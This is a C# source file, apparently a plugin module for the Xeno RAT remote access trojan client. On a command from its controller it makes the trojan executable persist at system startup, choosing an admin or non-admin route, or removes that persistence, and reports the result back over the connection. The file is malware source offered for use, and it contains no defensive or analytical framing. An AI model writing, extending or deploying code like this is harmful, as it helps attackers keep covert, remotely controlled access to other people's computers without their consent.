using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

using xeno_rat_client;


namespace Plugin
{
    public class Main
    {

        /// <summary>
        /// Asynchronously runs the specified node and performs various operations based on the received data.
        /// </summary>
        /// <param name="node">The node to be run and processed.</param>
        /// <exception cref="ArgumentNullException">Thrown when the input node is null.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method sends a byte array with a value of 3 to indicate that it has connected to the specified node.
        /// It then receives a byte array from the node and checks its length and content.
        /// If the received data is null or does not have a length of 1, the method disconnects from the node and returns.
        /// If the received data is 0, it checks if the current user has administrative privileges using the Utils.IsAdmin() method.
        /// If the user is an admin, it attempts to add the current executable to the system's startup using Utils.AddToStartupAdmin() method.
        /// If successful, it sends a byte array with a value of 1; otherwise, it sends a byte array with a value of 0.
        /// If the user is not an admin, it attempts to add the current executable to the system's startup using Utils.AddToStartupNonAdmin() method.
        /// If successful, it sends a byte array with a value of 1; otherwise, it sends a byte array with a value of 0.
        /// If the received data is 1, it removes the current executable from the system's startup using Utils.RemoveStartup() method.
        /// The method then waits for 1000 milliseconds before completing the asynchronous operation.
        /// </remarks>
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            string executablePath = System.Reflection.Assembly.GetEntryAssembly().Location;
            byte[] data = await node.ReceiveAsync();
            if (data == null || data.Length != 1)
            {
                node.Disconnect();
                return;
            }
            else if (data[0] == 0)
            {
                if (Utils.IsAdmin())
                {
                    if (await Utils.AddToStartupAdmin(executablePath))
                    {
                        await node.SendAsync(new byte[] { 1 });
                    }
                    else
                    {
                        await node.SendAsync(new byte[] { 0 });
                    }
                }
                else
                {
                    if (await Utils.AddToStartupNonAdmin(executablePath))
                    {
                        await node.SendAsync(new byte[] { 1 });
                    }
                    else
                    {
                        await node.SendAsync(new byte[] { 0 });
                    }
                }
            }
            else if (data[0] == 1) 
            {
                await Utils.RemoveStartup(executablePath);
            }
            await Task.Delay(1000);
        }
    }
}
